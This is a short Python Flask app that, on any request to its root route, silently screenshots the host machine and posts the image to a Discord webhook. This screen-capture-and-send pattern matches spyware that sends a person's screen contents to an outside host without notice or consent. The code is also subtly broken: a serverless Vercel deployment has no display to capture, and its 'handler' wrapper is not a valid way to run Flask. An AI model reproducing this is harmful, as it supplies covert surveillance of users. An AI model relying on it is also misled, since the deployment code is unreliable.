from flask import Flask, send_file
import pyautogui
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK")  # Use environment variable for security

@app.route("/", methods=["GET"])
def capture_screenshot():
    try:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot_path = "/tmp/screenshot.png"  # Use /tmp because Vercel is serverless
        screenshot.save(screenshot_path)

        # Send screenshot to Discord
        with open(screenshot_path, "rb") as file:
            requests.post(WEBHOOK_URL, files={"file": file})

        return "Screenshot taken and sent to Discord!", 200

    except Exception as e:
        return f"Error: {str(e)}", 500

# Required for Vercel
def handler(event, context):
    return app(event, context)

if __name__ == "__main__":
    app.run(debug=True)
